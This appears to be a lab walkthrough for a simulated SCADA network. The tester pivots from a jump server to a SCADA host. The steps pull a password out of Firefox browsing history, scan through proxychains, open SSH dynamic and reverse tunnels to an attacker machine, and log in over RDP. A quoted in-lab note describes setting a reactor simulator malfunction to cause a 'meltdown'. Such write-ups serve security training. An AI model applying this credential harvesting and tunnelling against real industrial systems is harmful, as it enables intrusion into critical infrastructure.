# Jump Server

- [Jump Server](#jump-server)
  - [Local Enumeration](#local-enumeration)
  - [Access scada-host.scada.local](#access-scada-hostscadalocal)
  - [mod_RSsim](#mod_rssim)
  - [PCTran](#pctran)
  - [ScadaAdmin](#scadaadmin)
  - [Accessing scada-host.scada.local (10.2.1.1)](#accessing-scada-hostscadalocal-10211)

---

## Local Enumeration

First see if the current user has SUDO privilege:

```
sudo -l
```
However we cannot run `sudo`:
![picture 43](images/02761d106996b99da376e40fcaf93253c49a3502e81359108ff017e2aaebd45f.png)  

<br/>

Check the current user's home, an nuclear operating instruction is shown:

```
cat Core_Reactor_notes
```

* Result:

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


        !!This file contains important information for
        proper operation of Nuclear Core Reactor!!


Extreme focus is on the heat generated by the Nuclear Reactor &
the cooling systems used to depress the amount of heat.


Scientist must be extreme cautious when dealing with the following cases:

- Loss or inadvertant withdrawl of coolant rods.

- Loss of Electric Power (Station Blackout)

- Failure of reactor protection systems.

- Natural Calamity (Earthquakes and fire)

The most probable case would be of inadvertant withdrawl of rods. 
On the SCADA-HOST, the PCTRAN application is the control panel for monitoring
and operating Nuclear Core Reactor. 

With access to PCTRAN control panel, the following procedure can replicate 
NUCLEAR MELTDOWN in core's reactor.

Code Control > Malfunctions > set option 12 (Inadvertent Rod Withdrawl)


Modify Delay Time (5)
Failure Fraction (100)
Check the active box 


Then, RUN the application, in 5 seconds, a message "OVERFlow" appears.

CAUTION: Nuclear Meltdown could be achieved by following the above procedure. 

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


```

<br/>

Checking the home directory, there is a folder related to Firefox `.mozilla`:

![picture 44](images/8acc3626f4f652867ccf515429a58ddea80c77f3f031b145e5907d04a9642d76.png)  

<br/>

To check the browsing history, look for the sqlite database named `places.sqlite`:

```
find . -name places.sqlite
```

![picture 45](images/e35f7cd8887be6e8233e852b132b83c0c3c525aa5e959d0d164f6ff204b20cb2.png)  

<br/>

Then use `sqlite3` to check the history:

```
sqlite3 places.sqlite
.tables
select * from moz_places;
```

![picture 46](images/9eeed0ff9bb20d3238d1b164b75797b5b5c9ccfc71ea12c10a627e7986b09e21.png)  

This reveal an unseen internal URL `https://scada-host.scada.local`, as well as the corresponding credential:
* `Administrator` / `SCADAAdmin!@#$%`

<br/>

Inspect the hosts file:

```
cat /etc/hosts
```

![picture 47](images/10d3da831b25485896f9749c89799f6634cc53cfb30a4d691ddce26580c4bedc.png)  

The IP address of `scada-host.scada.local` is 10.2.1.1.

<br/>

Check if this is reachable from proxychains on the attacker machine:

```
proxychains nmap -Pn -sT 10.2.1.1 -p 80
```

![picture 48](images/ed8b7a0002823d1572b2a8960410de1b63a49b03c023300de002b6ce00feb424.png)  

Not reachable.

<br/>

Test if it is reachable by the jump-server:

```
telnet 10.2.1.1 80
```

![picture 49](images/5913aab78cbe52e9679d9465d4d2a9823aad18af3253cabf5c2a1318f15fed89.png)  

As shown, jump-server can reach 10.2.1.1 (scada-host.scada.local).

<br/>

## Access scada-host.scada.local

To access, we need to do local port forward on the jump-server. To do so, we can setup Dynamic port forwarding since we know the SSH credential:

```
proxychains ssh -N -D 9051 jump-admin@10.1.1.4
```

<br/>

Modify local `/etc/proxychains.conf`:

![picture 50](images/242d8197b37f2bc177abe9af18aff19f6736684057d5651af6f9f97eff9b98b5.png)  

<br/>

Add `scada-host.scada.local` to the local `/etc/hosts`:

```
echo "10.2.1.1 scada-host.scada.local" >> /etc/hosts
```

<br/>

With configured FoxyProxy, try to access `https://10.2.1.1/RDWeb/Pages/en-US/login.aspx`:

![picture 51](images/ffac24d973dc7eff3ad9c98699ee48be1c84b3d90eab58bc81bad6f234e8e428.png)  

<br/>

Try to login with the previously found credential:
* `scada.local\Administrator` / `SCADAAdmin!@#$%`

![picture 52](images/72f143e306f8d6b7129b31dc9aafaea813f2764ec54264736045e1718aed921c.png)  

Login successfully.

<br/>

## mod_RSsim

Clicking on **mod_RSsim**, it is a RDP file:

![picture 53](images/693c3843d879f178f87c9ae2752c46b2c9cb44ba3e7bfb56687ebb61fe043ab3.png)  

<br/>

Checking the RDP file, a first time seen hostname `SCADA-HOST.scada.local` is found:

![picture 54](images/059f2d9fdafc909e54b50ae66b3e3bcf71b46a81c9e0de0e92cc5089ca8fd137.png)  

<br/>

## PCTran

Clciking on PCTran, it is also a RDP file:

![picture 55](images/de3767444862cde64ff5b95b9c74bcad0b3bcd8f91ca18f123c61efb56c84b21.png)  

<br/>

Similarly, the same host is found:

![picture 56](images/a04a310d7895c026d1841355a8c026b003f329f628172e8112c9c36e71fd1ccc.png)  

<br/>

## ScadaAdmin

Clicking on ScadaAdmin, it is yet another RDP file:

![picture 57](images/94f3a81cc2a053f01a1dfca717c36086adadbe5aa7936ffd7af48bbb2a961c2c.png)  

<br/>

## Accessing scada-host.scada.local (10.2.1.1)

Assume 10.1.1.4 can access RDP on 10.2.1.1. Since the RDP gateway is set on tcp/443 on 10.2.1.1, first establish a SSH reverse tunnel from the jump-server to the attacker machine:

```
ssh -R 443:10.2.1.1:443 root@192.168.100.11
```

![picture 58](images/ac2cfde85af08f4e9c98df8c56918222b1d4bd2280f286cd6ef46c2e79fda60d.png)  

<br/>

Check on the attacker machine to confirm it is listening on tcp/443:

```
netstat -antup | grep 443 | grep LISTEN
```

![picture 59](images/11ec853215e8bb8ed625426644844a0ea5d542bb7dc2cf288f646c8cfa5f0ddc.png)  

<br/>

Edit /etc/hosts and change the IP address of `scada-host.scada.local` to be `127.0.0.1`.

![picture 60](images/b4a84fcc190d76290bd463633e746ccc6e711f18071a29240a8d7a809638c0d7.png)  

<br/>

Then use `xfreerdp` to connect:

```
xfreerdp /d:scada /u:Administrator /p:'SCADAAdmin!@#$%' /v:scada-host.scada.local /g:scada-host.scada.local
```

![picture 61](images/0e1981d1e8e74361ff63d94d0f1a85b5bb0c98462936a16479ad482d423b0c57.png)  

<br/>

As shown, the RDP connection is established.

